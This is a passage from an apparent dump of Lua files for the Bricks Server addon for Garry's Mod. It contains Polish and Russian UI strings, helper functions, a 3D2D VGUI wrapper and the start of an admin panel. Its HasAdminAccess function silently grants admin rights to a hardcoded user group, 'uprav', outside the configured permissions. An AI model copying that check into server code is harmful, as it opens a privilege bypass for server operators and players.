    ["unselected"] = "Nie zaznaczone",
    ["add"] = "Dodaj",
 
    ["shootyStick"] = "A shooty stick!",
    ["permanent"] = "Na stałe",
    ["tierX"] = "(Tier %d)",
    ["someDescription"] = "Opis.",
    ["invalidNPC"] = "BŁAD BRICK SERVER: Nieprawidłowy NPC",
 
    ["disconnected"] = "Rozłączono",
    ["profileView"] = "Widok profilu",
    ["loading"] = "Wczytywanie",
    ["statistics"] = "Statystyki",
    ["steamID64"] = "SteamID64",
    ["donationRank"] = "Rnga darczyńcy",
    ["staffRank"] = "Ranga personelu",
    ["currentJob"] = "Obecna praca",
    ["wallet"] = "Portfel",
    ["level"] = "Poziom",
    ["levelX"] = "Poziom %d",
    ["experience"] = "Doświadczenie",
    ["exp"] = "EXP",
    ["money"] = "Pieniądze",
    ["playerLogs"] = "Dziennik gracza",
    ["deleteLogs"] = "Usuń dziennik",
    ["xLogs"] = "%d logs",
    ["xAdminGroups"] = "%d Grup adminów",
    ["noUserGroups"] = "No Grup użytkownikó",
    ["userGroups"] = "Grupy użytkowników: %s",
    ["editUserGroups"] = "Edytuj grupy użytkowników",
    ["newGroupColor"] = "Jaki powinien być nowy kolor grupy?",
    ["newGroupName"] = "Jaka powinna być nowa nazwa grupy?",
    ["groupAlreadyExists"] = "Ta grupa już istnieje!",
    ["whitelist"] = "Biała lista",
    ["unWhitelist"] = "Usuń z białej listy",
    ["addCustom"] = "Dodaj niestandardową",
    ["entClassWhitelist"] = "Jaką klase jednostek chciałbyś wprowadzić na białą liste?",
    ["entClassAlreadyOnList"] = "Ta klasa jednostek jest już na liscie!",
    ["changesServerRestart"] = "Niektóre zmiany nie będą działały do póki nie zresetujesz serwera!",
    ["comingSoon"] = "Zaraz będzie!",
    ["features"] = "CECHY",
    ["addNewRarity"] = "Dodaj nową rzadkość",
    ["newRarity"] = "Nowa rzadkosć",
    ["needToAddRarity"] = "Musisz pierw dodać rzadkość przedmiotu!",
    ["whatRarityItem"] = "Jaką rzadkość powinien mieć ten przedmiot?",
    ["invalidRarity"] = "Niepoprawna rzadkośc.",
    ["rarityAlreadyExists"] = "Rzadkość z tym imieniem już egzystuje!",
    ["themeColorX"] = "Motyw - Kolor %d",
    ["themeTextColor"] = "Motyw - Kolor textu",
    ["presetAccents"] = "Gotowe akcenty",
    ["presetBackgrounds"] = "Gotowe tła",
    ["resetToBaseThemes"] = "Zresetuj bazowy motyw",
    ["resetToCurrentThemes"] = "Zresetuj bazowe motywy",
    ["toggle"] = "Przełącznik",
    ["menu"] = "Menu",
    ["emptyValue"] = "PUSTA WARTOSC",
    ["newValueQuery"] = "Jaka powinna być nowa wartość?",
    ["pressKey"] = "Wciśnij klawisz",
 
    ["entityPlacer"] = "Umieszczacz jednostek",
    ["invalidEntityType"] = "Nieprawidłowy rodzaj jednostki, wybierz odpowiednią z menu narzędzi.",
    ["entityPlaced"] = "Jednostka pomyśłnie umieszczona.",
    ["entityRemoved"] = "Jednostka pomyślnie usunieta.",
    ["canOnlyUseToolEntity"] = "Możesz używać tego narzędzia tylko do przesuwania/tworzenia jednostek.",
    ["entityType"] = "Rodzaj jednostki",
    ["entityPlacerDescription"] = "Umieszczaj i usuwaj jednostki z serwerów Brick i zapisuj ich pozycje. Lewyprzycisk - umieść. Prawyprzycisk - usuń.",
    ["entityPlacerDescriptionSmall"] = "Umieszczaj i usuwaj jednostki",
    ["entityPlacerInstructions"] = "Lewyprzycisk - umieść, Prawyprzycisk - usuń.",
 
    ["npcPlacer"] = "Umiezczacz NPC",
    ["npcPlaced"] = "NPC ustawiony.",
    ["invalidNPCType"] = "Nieprawidłowy rodzaj NPC, wybierz włąściwy z menu narzędzi.",
    ["npcRemoved"] = "NPC usunięty.",
    ["errorNotNPC"] = "Możesz używać tego narzędzia tylko do usuwania/tworzenia NPC.",
    ["npcPlacerDescription"] = "Umieszczaj i usuwaj NPC z serweró Brick, Lewyprzycisk - umieśc, Prawyprzycisk - usuń.",
    ["npcPlacerDescriptionSmall"] = "Umieszczaj i usuwaj NPC z serweró Brick's.",
 
    ["inventory"] = "Ekwipunek",
    ["player"] = "Gracz",
    ["drop"] = "Wyrzuć",
    ["use"] = "Użyj",
    ["dropAll"] = "Wyrzuć wszystko",
    ["delete"] = "Usuń",
} )
--PATH addons/brick_s_server_framework/lua/bricks_server/languages/bricks_server/russian.lua:
BRICKS_SERVER.Func.AddLanguageStrings( "russian", {
    ["search"] = "Поиск",
    ["invalidPlayerProfile"] = "Запрошен неверный профиль игрока!",
    ["unbound"] = "НЕ ПРИВЯЗАН",
    ["themes"] = "Темы",
    ["groups"] = "Группы",
    ["general"] = "Основное",
    ["itemWhitelisting"] = "Белый список предметов",
    ["rarities"] = "Раритеты",
    ["languages"] = "Языки",
    ["disabled"] = "Отключено",
    ["enabled"] = "Включено",
    ["purchase"] = "Купить",
    ["profile"] = "Профиль",
    ["view"] = "Посмотреть",
    ["admin"] = "АДМИН",
    ["noToolPermission"] = "Нет прав.",
    ["settings"] = "Настройки",
    ["players"] = "Игроки",
    ["modules"] = "Модули",

    ["userGroupEditor"] = "Редактор групп пользователей",
    ["addNewGroup"] = "Добавить новую группу",
    ["newUserGroup"] = "Какой должна быть новая группа пользователей?",
    ["groupName"] = "Название",

    ["custom"] = "Свое",
    ["addNew"] = "Добавить новую",
    ["material"] = "Материал",
    ["directImage"] = "Введите URL прямого изображения ниже.",
    ["default"] = "Стандарт",
    ["selectMaterial"] = "Вы должны выбрать материал!",

    ["errorNoText"] = "ОШИБКА: НЕТ ТЕКСТА",
    ["selectOption"] = "Выберите опцию",
    ["selectValue"] = "Выберите значение.",
    ["selectColor"] = "Выберите цвет.",
    ["configSaved"] = "Конфиг сохранен!",
    ["cmdNoPermission"] = "Нет прав.",
    ["entityPosUpdated"] = "Позиция entity сохранена.",
    ["noEntitiesSpawned"] = "Нет сохраненных entities.",
    ["xEntitiesSpawned"] = "%d сохранил entities где был заспавнен.",
    ["error"] = "ERROR",

    ["seconds"] = "%d секунд",
    ["second"] = "%d секунда",
    ["minutes"] = "%d минуты",
    ["minute"] = "%d минута",
    ["hours"] = "%d часы",
    ["hour"] = "%d час",

    ["noRarity"] = "Нет редкости",

    ["config"] = "Настройки [Конфиг]",
    ["edit"] = "Изменить",
    ["editColor"] = "Изменить цвет",
    ["editName"] = "Изменить название",
    ["remove"] = "Удалить",
    ["name"] = "Название",
    ["description"] = "Описание",
    ["model"] = "Модель",
    ["icon"] = "Значек",
    ["type"] = "Тип",
    ["price"] = "Стоимость",
    ["group"] = "Группа",
    ["category"] = "Категория",
    ["color"] = "Цвет",
    ["invalidType"] = "Неверный тип.",
    ["invalidOption"] = "Неверная опция.",
    ["invalidChoice"] = "Неверный выбор.",
    ["invalidGroup"] = "Неверная группа.",
    ["invalidPlayer"] = "Неверный игрок.",
    ["true"] = "ВКЛ",
    ["false"] = "ВЫКЛ",
    ["noDescription"] = "Нет описания",
    ["other"] = "Остальное",
    ["completed"] = "Выполнено",
    ["close"] = "Закрыть",
    ["main"] = "Меню",
    
    ["valueQuery"] = "Что следует %s?",
    ["dataValueQuery"] = "Какие данные должны это?",
    ["newNameQuery"] = "Что следует новому имени?",
    ["newDescriptionQuery"] = "Что следует новому описанию?",
    ["newModelQuery"] = "Что следует новой моделе?",
    ["newIconQuery"] = "Что следует новой иконке?",
    ["newColorQuery"] = "Что следует новому цвету?",
    ["npcTypeQuery"] = "Какой тип этого NPC?",
    ["newTypeQuery"] = "Что следует типу",
    ["groupRequirementQuery"] = "Что следует требованиям группы?",
    ["levelRequirementQuery"] = "Что следует уровню группы?",
    ["newPriceQuery"] = "Что следует новой стоимости?",
    ["newCategoryQuery"] = "Что следует новой категории?",

    ["npcEditor"] = "Настройка NPC [Editor]",
    ["addNPC"] = "Добавить NPC",
    ["newNPC"] = "Новый NPC",

    ["ok"] = "OK",
    ["cancel"] = "Отмена",
    ["save"] = "Сохранить",
    ["confirm"] = "Подтвердить",
    ["nil"] = "NIL",
    ["none"] = "Ничего",
    ["selected"] = "Выбрано",
    ["unselected"] = "Не выбрано",
    ["add"] = "Добавить",

    ["shootyStick"] = "Стрелка!",
    ["permanent"] = "Вечная",
    ["tierX"] = "(Уровень %d)",
    ["someDescription"] = "Некоторое описание.",
    ["invalidNPC"] = "BRICKS SERVER ERROR: Неверный NPC",

    ["disconnected"] = "Отключился",
    ["profileView"] = "Просмотр профиля",
    ["loading"] = "Загрузка",
    ["statistics"] = "Статистика",
    ["steamID64"] = "SteamID64",
    ["donationRank"] = "Рейтинг пожертвований",
    ["staffRank"] = "Рейтинг персонала",
    ["currentJob"] = "Текущее место работы",
    ["wallet"] = "Бумажник",
    ["level"] = "Уровень",
    ["levelX"] = "Уровень %d",
    ["experience"] = "ОПЫТ",
    ["exp"] = "EXP",
    ["money"] = "Деньги",
    ["playerLogs"] = "Логи игрока",
    ["deleteLogs"] = "Удалить логи",
    ["xLogs"] = "%d логи",
    ["xAdminGroups"] = "%d Админ группы",
    ["noUserGroups"] = "Нет групп пользователей",
    ["userGroups"] = "Группы пользователей: %s",
    ["editUserGroups"] = "Изменить группы пользователей",
    ["newGroupColor"] = "Что следует новому цвету группу?",
    ["newGroupName"] = "Какое название новой группы?",
    ["groupAlreadyExists"] = "Эта группа уже существует!",
    ["whitelist"] = "Белый список",
    ["unWhitelist"] = "Искл. из белого списка",
    ["addCustom"] = "Добавить свое",
    ["entClassWhitelist"] = "Какой класс сущностей вы бы хотели добавить в белый список?",
    ["entClassAlreadyOnList"] = "Этот класс сущностей уже есть в списке!",
    ["changesServerRestart"] = "Некоторые изменения не вступят в силу, пока сервер не будет перезагружен!",
    ["comingSoon"] = "Скоро!",
    ["features"] = "ФУНКЦИИ",
    ["addNewRarity"] = "Добавить новый раритет",
    ["newRarity"] = "Новый раритет",
    ["needToAddRarity"] = "Вы должны сначала добавить тип редкости!",
    ["whatRarityItem"] = "Какой редкости стоит этот предмет?",
    ["invalidRarity"] = "Неверная редкость.",
    ["rarityAlreadyExists"] = "Редкость с таким названием уже существует!",
    ["themeColorX"] = "Тема - Цвет %d",
    ["themeTextColor"] = "Тема - Цвет текста",
    ["presetAccents"] = "Предустановленные акценты",
    ["presetBackgrounds"] = "Предустановленные фоны",
    ["resetToBaseThemes"] = "Сбросить тему к стандарту",
    ["resetToCurrentThemes"] = "Сброс к текущим темам",
    ["toggle"] = "Включить",
    ["menu"] = "Меню",
    ["emptyValue"] = "Пустое значение",
    ["newValueQuery"] = "Что следует пустому значению?",
    ["pressKey"] = "НАЖМИТЕ НА A",

    ["entityPlacer"] = "Спавн нового Entity",
    ["invalidEntityType"] = "Неверный тип объекта, выберите правильный из меню инструментов.",
    ["entityPlaced"] = "Объект успешно размещен.",
    ["entityRemoved"] = "Сущность успешно удалена.",
    ["canOnlyUseToolEntity"] = "Вы можете использовать этот инструмент только для удаления или создания объекта.",
    ["entityType"] = "Entity Тип",
    ["entityPlacerDescription"] = "Размещает и удаляет объекты с сервера Bricks и сохраняет их позиции. Левый щелчок - место. Правый клик - удалить.",
    ["entityPlacerDescriptionSmall"] = "Размещает и удаляет объекты",
    ["entityPlacerInstructions"] = "Левый клик - разместить, правый клик - удалить.",

    ["npcPlacer"] = "Установка NPC",
    ["npcPlaced"] = "NPC успешно размещен.",
    ["invalidNPCType"] = "Неверный тип NPC, выберите правильный из меню инструментов.",
    ["npcRemoved"] = "NPC успешно удален.",
    ["errorNotNPC"] = "Вы можете использовать этот инструмент только для удаления или создания NPC.",
    ["npcPlacerDescription"] = "Размещает и удаляет NPC с сервера Bricks. Щелкните левой кнопкой мыши - поместите, щелкните правой кнопкой мыши - удалите.",
    ["npcPlacerDescriptionSmall"] = "Размещает и удаляет NPC с сервера Brick.",

    ["inventory"] = "Инвентарь",
    ["player"] = "Игрок",
    ["drop"] = "Выбросить",
    ["use"] = "Использовать",
    ["dropAll"] = "Выбросить все",
    ["delete"] = "Удалить",
} )
--PATH addons/brick_s_server_framework/lua/bricks_server/core/shared/sh_functions.lua:
AddCSLuaFile( "sh_cami.lua" )
include( "sh_cami.lua" )

function BRICKS_SERVER.Func.GetAdminGroup( ply )
	if( serverguard ) then
		return serverguard.player:GetRank( ply )
	else
		return ply:GetNW2String( "usergroup", "" )
	end

	return ""
end

function BRICKS_SERVER.Func.HasAdminAccess( ply )
	if( not IsValid( ply ) ) then return end

	if( ply:IsSuperAdmin() or ply:GetUserGroup() == "uprav" )  then return true end
	
	if( BRICKS_SERVER.CONFIG.GENERAL.AdminPermissions ) then
		if( xAdmin ) then
			for k, v in pairs( BRICKS_SERVER.CONFIG.GENERAL.AdminPermissions ) do
				if( ply:IsUserGroup( v ) ) then
					return true
				end
			end
		else
			return table.HasValue( BRICKS_SERVER.CONFIG.GENERAL.AdminPermissions, BRICKS_SERVER.Func.GetAdminGroup( ply ) )
		end
	end
end

function BRICKS_SERVER.Func.GetAdminSystemRanks()
	local ranks = {}
	for k, v in pairs( CAMI:GetUsergroups() ) do
		ranks[k] = v.Name
	end

	return ranks
end

function BRICKS_SERVER.Func.IsInGroup( ply, group )
	local groupTable = {}
	for k, v in pairs( BRICKS_SERVER.CONFIG.GENERAL.Groups ) do
		if( group == v[1] ) then
			groupTable = v
			break
		end
	end

	if( groupTable ) then
		if( (groupTable[2] or {})[BRICKS_SERVER.Func.GetAdminGroup( ply )] ) then
			return true
		end

		if( xAdmin ) then
			for k, v in pairs( (groupTable[2] or {}) ) do
				if( ply:IsUserGroup( k ) ) then
					return true
				end
			end
		end

		if( sam and ply.GetSecondaryUserGroup and groupTable[ply:GetSecondaryUserGroup()] ) then
			return true
		end
	else
		return true
	end

	return false
end

function BRICKS_SERVER.Func.GetGroup( ply )
	for k, v in pairs( BRICKS_SERVER.CONFIG.GENERAL.Groups ) do
		if( BRICKS_SERVER.Func.IsInGroup( ply, v[1] ) ) then return v, k end
	end

	for k, v in pairs( BRICKS_SERVER.CONFIG.GENERAL.Groups ) do
		if( v[4] ) then return v, k end
	end

	return false
end

function BRICKS_SERVER.Func.FormatTime( time, miliSeconds, dontShowHours )
	local timeTable = string.FormattedTime( time )

	if( time >= 86400 ) then
		return math.floor( time/86400 ) .. " days, " .. string.format( "%02i:%02i:%02i", timeTable.h-(math.floor( time/86400 )*24), timeTable.m, timeTable.s )
	else
		if( not miliSeconds ) then
			return dontShowHours and string.format( "%02i:%02i", timeTable.m, timeTable.s ) or string.format( "%02i:%02i:%02i", timeTable.h, timeTable.m, timeTable.s )
		else
			return string.format( "%02i:%02i:%02i", timeTable.h, timeTable.m, timeTable.s, timeTable.ms )
		end
	end
end

function BRICKS_SERVER.Func.FormatWordTime( time )
	local timeText = (time != 1 and BRICKS_SERVER.Func.L( "seconds", time )) or BRICKS_SERVER.Func.L( "second", time )

	if( time >= 60 ) then
		if( time < 3600 ) then
			local minutes = math.floor( time/60 )
			timeText = (minutes != 1 and BRICKS_SERVER.Func.L( "minutes", minutes )) or BRICKS_SERVER.Func.L( "minute", minutes )
		else
			if( time < 86400 ) then
				local hours = math.floor( time/3600 )
				timeText = (hours != 1 and BRICKS_SERVER.Func.L( "hours", hours )) or BRICKS_SERVER.Func.L( "hour", hours )
			else
				local days = math.floor( time/86400 )
				timeText = (days != 1 and BRICKS_SERVER.Func.L( "days", days )) or BRICKS_SERVER.Func.L( "day", days )
			end
		end
	end

	return timeText
end

function BRICKS_SERVER.Func.FormatTimeInPlace( time )
	local currentDate = os.date( "*t" )
	local dateTable = os.date( "*t", time )
	
	if( dateTable.day == currentDate.day ) then
		return os.date( "%H:%M", time )
	else
		return os.date( "%d/%m/%Y", time )
	end
end

function BRICKS_SERVER.Func.GetList( listReq )
	if( listReq == "boosters" ) then
		local boosters = {}
		for k, v in pairs( BS_ConfigCopyTable.BOOSTERS ) do
			boosters[k] = v.Title
		end

		return boosters
	elseif( listReq == "vehicles" ) then
		local vehicles = {}
		for k, v in pairs( list.Get( "Vehicles" ) ) do
			vehicles[k] = v.Name or BRICKS_SERVER.Func.L( "error" )
		end

		return vehicles
	elseif( listReq == "weapons" ) then
		local weapons = {}
		for k, v in pairs( list.Get( "Weapon" ) ) do
			weapons[k] = ((v.PrintName or "") != "" and v.PrintName) or k
		end

		return weapons
	elseif( listReq == "entities" ) then
		local entities = {}
		for k, v in pairs( list.Get( "SpawnableEntities" ) ) do
			entities[k] = ((v.PrintName or "") != "" and v.PrintName) or k
		end

		return entities
	elseif( listReq == "resources" ) then
		local resources = {}
		for k, v in pairs( BS_ConfigCopyTable.CRAFTING.Resources ) do
			resources[k] = k
		end

		return resources
	elseif( listReq == "currencies" ) then
		local currencies = {}
		for k, v in pairs( BRICKS_SERVER.DEVCONFIG.Currencies ) do
			currencies[k] = v.Title
		end

		return currencies
	elseif( listReq == "ammo" ) then
		local ammo = {}

		local currentID = 1
		while true do
			local ammoType = game.GetAmmoData( currentID )

			if( ammoType and istable( ammoType ) ) then
				ammo[ammoType.name] = ammoType.name
				currentID = currentID+1
			else
				break
			end
		end

		return ammo
	elseif( listReq == "easySkins" ) then
		local skins = {}
		for k, v in pairs( SH_EASYSKINS.GetSkins() ) do
			skins[v.id] = v.dispName
		end

		return skins
	else
		return {}
	end
end

function BRICKS_SERVER.Func.GetWeaponName( weaponClass )
	if( weapons.GetStored( weaponClass ) and weapons.GetStored( weaponClass ).PrintName ) then
		return weapons.GetStored( weaponClass ).PrintName
	end
end

function BRICKS_SERVER.Func.GetWeaponModel( weaponClass )
	if( weapons.GetStored( weaponClass ) and weapons.GetStored( weaponClass ).WorldModel ) then
		return weapons.GetStored( weaponClass ).WorldModel
	elseif( BRICKS_SERVER.DEVCONFIG.WeaponModels[weaponClass] ) then
		return BRICKS_SERVER.DEVCONFIG.WeaponModels[weaponClass]
	end
end

function BRICKS_SERVER.Func.GetRarityInfo( rarityName )
	for k, v in pairs( (BS_ConfigCopyTable or BRICKS_SERVER.CONFIG).GENERAL.Rarities or {} ) do
		if( (v[1] or "") == rarityName ) then
			return v, k
		end
	end

	return (BS_ConfigCopyTable or BRICKS_SERVER.CONFIG).GENERAL.Rarities[1], 1
end

function BRICKS_SERVER.Func.GetRarityColor( rarityInfo )
	if( not rarityInfo or not rarityInfo[2] ) then return BRICKS_SERVER.Func.GetTheme( 5 ) end

	local rarityType = rarityInfo[2]
	if( rarityType == "SolidColor" ) then
		return rarityInfo[3]
	elseif( rarityType == "Gradient" ) then
		return rarityInfo[3][1]
	elseif( rarityType == "Fade" ) then
		return rarityInfo[3][1]
	elseif( rarityType == "Rainbow" ) then
		return HSVToColor( CurTime()*360, 1, 1 )
	end
end

function BRICKS_SERVER.Func.GetRarityItems()
	local possibleItems = {}
	for k, v in pairs( list.Get( "Weapon" ) ) do
		local weaponModel = BRICKS_SERVER.Func.GetWeaponModel( k )
		if( weaponModel ) then
			possibleItems[k] = { (v.PrintName or BRICKS_SERVER.Func.L( "nil" )), weaponModel }
		else
			possibleItems[k] = { (v.PrintName or BRICKS_SERVER.Func.L( "nil" )) }
		end
	end

	if( BRICKS_SERVER.Func.IsSubModuleEnabled( "essentials", "crafting" ) ) then
		for k, v in pairs( BRICKS_SERVER.CONFIG.CRAFTING.Resources ) do
			possibleItems[k] = { k, v[1], v[2] }
		end
	end

	for k, v in pairs( BRICKS_SERVER.CONFIG.INVENTORY.Whitelist or {} ) do
		if( k == "spawned_weapon" or k == "spawned_shipment" or string.StartWith( k, "bricks_server_resource" ) ) then continue end

		if( list.Get( "SpawnableEntities" )[k] ) then
			possibleItems[k] = { list.Get( "SpawnableEntities" )[k].PrintName or k }
		else
			possibleItems[k] = { k }
		end
	end

	return possibleItems
end

function BRICKS_SERVER.Func.GetInvTypeCFG( class )
	if( BRICKS_SERVER.DEVCONFIG.INVENTORY.EntTypes[class] ) then
		return BRICKS_SERVER.DEVCONFIG.INVENTORY.EntTypes[class]
	else
		for k, v in pairs( BRICKS_SERVER.DEVCONFIG.INVENTORY.EntTypes ) do
			if( string.EndsWith( k, "*" ) ) then
				local starter = string.Replace( k, "*", "" )
				if( string.StartWith( class, starter ) ) then
					return BRICKS_SERVER.DEVCONFIG.INVENTORY.EntTypes[k]
				end
			end
		end
		return BRICKS_SERVER.DEVCONFIG.INVENTORY.DefaultEntFuncs
	end
end

function BRICKS_SERVER.Func.GetEntTypeField( class, field )
	local entTypeCfg = BRICKS_SERVER.Func.GetInvTypeCFG( class )

	if( entTypeCfg[field] ) then
		return entTypeCfg[field]
	else
		return BRICKS_SERVER.DEVCONFIG.INVENTORY.DefaultEntFuncs[field] or false
	end
end

function BRICKS_SERVER.Func.GetTranslatedString( lang, string, func )
    lang  = lang  or "en"
    string = string or ""

    if lang == "en" or string == "" then
        func( string )
	end
	
	local urlFetch = "https://translate.googleapis.com/translate_a/single?client=gtx&sl=en&tl=" .. lang .. "&dt=t&q=" .. string.Replace( string, " ", "-" )

    http.Fetch( urlFetch, function( bodyString, bodyLen, headers, successCode )
		local jsonTable = util.JSONToTable( bodyString )

		if( jsonTable and jsonTable[1] and jsonTable[1][1] and jsonTable[1][1][1] ) then
			func( jsonTable[1][1][1] )
		else
			func( false, "INVALID TABLE" )
		end
	end, function( errorMsg )
		func( false, errorMsg )
	end )
end

function BRICKS_SERVER.Func.UTCTime()
	return os.time( os.date( "!*t" ) )
end
--PATH addons/brick_s_server_framework/lua/bricks_server/core/client/cl_3d2dvgui.lua:
--[[
	
3D2D VGUI Wrapper
Copyright (c) 2015-2017 Alexander Overvoorde, Matt Stevens

Permission is hereby granted, free of charge, to any person obtaining a copy of
this software and associated documentation files (the "Software"), to deal in
the Software without restriction, including without limitation the rights to
use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of
the Software, and to permit persons to whom the Software is furnished to do so,
subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS
FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR
COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER
IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN
CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

]]--

local origin = Vector(0, 0, 0)
local angle = Angle(0, 0, 0)
local normal = Vector(0, 0, 0)
local scale = 0
local maxrange = 0

-- Helper functions

local function getCursorPos()
	local p = util.IntersectRayWithPlane(LocalPlayer():EyePos(), LocalPlayer():GetAimVector(), origin, normal)

	-- if there wasn't an intersection, don't calculate anything.
	if not p then return end
	if WorldToLocal(LocalPlayer():GetShootPos(), Angle(0,0,0), origin, angle).z < 0 then return end

	if maxrange > 0 then
		if p:Distance(LocalPlayer():EyePos()) > maxrange then
			return
		end
	end

	local pos = WorldToLocal(p, Angle(0,0,0), origin, angle)

	return pos.x, -pos.y
end

local function getParents(pnl)
	local parents = {}
	local parent = pnl:GetParent()
	while parent do
		table.insert(parents, parent)
		parent = parent:GetParent()
	end
	return parents
end

local function absolutePanelPos(pnl)
	local x, y = pnl:GetPos()
	local parents = getParents(pnl)
	
	for _, parent in ipairs(parents) do
		local px, py = parent:GetPos()
		x = x + px
		y = y + py
	end
	
	return x, y
end

local function pointInsidePanel(pnl, x, y)
	local px, py = absolutePanelPos(pnl)
	local sx, sy = pnl:GetSize()

	if not x or not y then return end

	x = x / scale
	y = y / scale

	return pnl:IsVisible() and x >= px and y >= py and x <= px + sx and y <= py + sy
end

-- Input

local inputWindows = {}
local usedpanel = {}

local function isMouseOver(pnl)
	return pointInsidePanel(pnl, getCursorPos())
end

local function postPanelEvent(pnl, event, ...)
	if not IsValid(pnl) or not pnl:IsVisible() or not pointInsidePanel(pnl, getCursorPos()) then return false end

	local handled = false
	
	for i, child in pairs(table.Reverse(pnl:GetChildren())) do
		if postPanelEvent(child, event, ...) then
			handled = true
			break
		end
	end
	
	if not handled and pnl[event] then
		pnl[event](pnl, ...)
		usedpanel[pnl] = {...}
		return true
	else
		return false
	end
end

-- Always have issue, but less
local function checkHover(pnl, x, y, found)
	if not (x and y) then
		x, y = getCursorPos()
	end

	local validchild = false
	for c, child in pairs(table.Reverse(pnl:GetChildren())) do
		local check = checkHover(child, x, y, found or validchild)

		if check then
			validchild = true
		end
	end

	if found then
		if pnl.Hovered then
			pnl.Hovered = false
			if pnl.OnCursorExited then pnl:OnCursorExited() end
		end
	else
		if not validchild and pointInsidePanel(pnl, x, y) then
			pnl.Hovered = true
			if pnl.OnCursorEntered then pnl:OnCursorEntered() end

			return true
		else
			pnl.Hovered = false
			if pnl.OnCursorExited then pnl:OnCursorExited() end
		end
	end

	return false
end

-- Mouse input

hook.Add("KeyPress", "VGUI3D2DMousePress", function(_, key)
	if key == IN_USE then
		for pnl in pairs(inputWindows) do
			if IsValid(pnl) then
				origin = pnl.Origin
				scale = pnl.Scale
				angle = pnl.Angle
				normal = pnl.Normal

				local key = input.IsKeyDown(KEY_LSHIFT) and MOUSE_RIGHT or MOUSE_LEFT
				
				postPanelEvent(pnl, "OnMousePressed", key)
			end
		end
	end
end)

hook.Add("KeyRelease", "VGUI3D2DMouseRelease", function(_, key)
	if key == IN_USE then
		for pnl, key in pairs(usedpanel) do
			if IsValid(pnl) then
				origin = pnl.Origin
				scale = pnl.Scale
				angle = pnl.Angle
				normal = pnl.Normal

				if pnl["OnMouseReleased"] then
					pnl["OnMouseReleased"](pnl, key[1])
				end

				usedpanel[pnl] = nil
			end
		end
	end
end)

function vgui.Start3D2D(pos, ang, res)
	origin = pos
	scale = res
	angle = ang
	normal = ang:Up()
	maxrange = 0
	
	cam.Start3D2D(pos, ang, res)
end

function vgui.MaxRange3D2D(range)
	maxrange = isnumber(range) and range or 0
end

function vgui.IsPointingPanel(pnl)
	origin = pnl.Origin
	scale = pnl.Scale
	angle = pnl.Angle
	normal = pnl.Normal

	return pointInsidePanel(pnl, getCursorPos())
end

local Panel = FindMetaTable("Panel")
function Panel:Paint3D2D()
	if not IsValid( self ) then return end
	
	-- Add it to the list of windows to receive input
	inputWindows[self] = true

	-- Override gui.MouseX and gui.MouseY for certain stuff
	local oldMouseX = gui.MouseX
	local oldMouseY = gui.MouseY
	local cx, cy = getCursorPos()

	function gui.MouseX()
		return (cx or 0) / scale
	end
	function gui.MouseY()
		return (cy or 0) / scale
	end
	
	-- Override think of DFrame's to correct the mouse pos by changing the active orientation
	if self.Think then
		if not self.OThink then
			self.OThink = self.Think
			
			self.Think = function()
				origin = self.Origin
				scale = self.Scale
				angle = self.Angle
				normal = self.Normal
				
				self:OThink()
			end
		end
	end
	
	-- Update the hover state of controls
	local _, tab = checkHover(self)
	
	-- Store the orientation of the window to calculate the position outside the render loop
	self.Origin = origin
	self.Scale = scale
	self.Angle = angle
	self.Normal = normal
	
	-- Draw it manually
	self:SetPaintedManually(false)
		self:PaintManual()
	self:SetPaintedManually(true)

	gui.MouseX = oldMouseX
	gui.MouseY = oldMouseY
end

function vgui.End3D2D()
	cam.End3D2D()
end
--PATH addons/brick_s_server_framework/lua/bricks_server/vgui/bricks_server_admin.lua:
local PANEL = {}

function PANEL:Init()
    if( BRICKS_SERVER.Func.HasAdminAccess( LocalPlayer() ) ) then
        self.panelWide = ScrW()*0.6-BRICKS_SERVER.DEVCONFIG.MainNavWidth
        
        self.topBar = vgui.Create( "DPanel", self )
        self.topBar:Dock( TOP )
        self.topBar:SetTall( 60 )
        self.topBar.Paint = function( self, w, h ) 
            surface.SetDrawColor( BRICKS_SERVER.Func.GetTheme( 2 ) )
            surface.DrawRect( 0, 0, w, h )
        end 
    
        self.searchBar = vgui.Create( "bricks_server_searchbar", self.topBar )
        self.searchBar:Dock( LEFT )
        self.searchBar:DockMargin( 25, 10, 10, 10 )
        self.searchBar:SetWide( ScrW()*0.2 )
        self.searchBar:SetBackColor( BRICKS_SERVER.Func.GetTheme( 1 ) )
        self.searchBar:SetHighlightColor( BRICKS_SERVER.Func.GetTheme( 0 ) )
        self.searchBar.OnChange = function()
            self:Refresh()
        end
    
        self.scrollPanel = vgui.Create( "bricks_server_scrollpanel_bar", self )
        self.scrollPanel:Dock( FILL )
        self.scrollPanel:DockMargin( 25, 25, 25, 25 )
        self.scrollPanel.Paint = function( self, w, h ) end 

        local slotsWide = 3
        self.spacing = 10
        local gridWide = self.panelWide-50-10-self.spacing
        self.slotWide, self.slotTall = (gridWide-((slotsWide-1)*self.spacing))/slotsWide, 75
    
        self.slotPanels = {}
        for i = 1, slotsWide do
            self.slotPanels[i] = vgui.Create( "DPanel", self.scrollPanel )
            self.slotPanels[i]:SetPos( ((i-1)*(self.slotWide+self.spacing)), 0 )
            self.slotPanels[i]:SetSize( self.slotWide, 0 )
            self.slotPanels[i].slotCount = 0
            self.slotPanels[i].Paint = function() end
        end

        self.loadedPlayers = {}
        
        self:Refresh()
    end
end

function PANEL:Refresh()
    for k, v in ipairs( self.slotPanels ) do
        v:Clear()
        v:SetTall( 0 )
        v.slotCount = 0
    end

    local actionCategories = {}
    for k, v in pairs( BRICKS_SERVER.AdminPlayerFunctions or {} ) do
        if( not actionCategories[v[2]] ) then
            actionCategories[v[2]] = {}
        end

        table.insert( actionCategories[v[2]], v )
    end

    self.loadedPlayers = {}
    for k, v in player.Iterator() do
        self.loadedPlayers[v] = true

        if( self.searchBar:GetValue() != "" and not string.find( string.lower( v:Nick() ), string.lower( self.searchBar:GetValue() ) ) and not string.find( string.lower( v:SteamID64() or "" ), string.lower( self.searchBar:GetValue() ) ) ) then
            continue
        end

        local slotParent
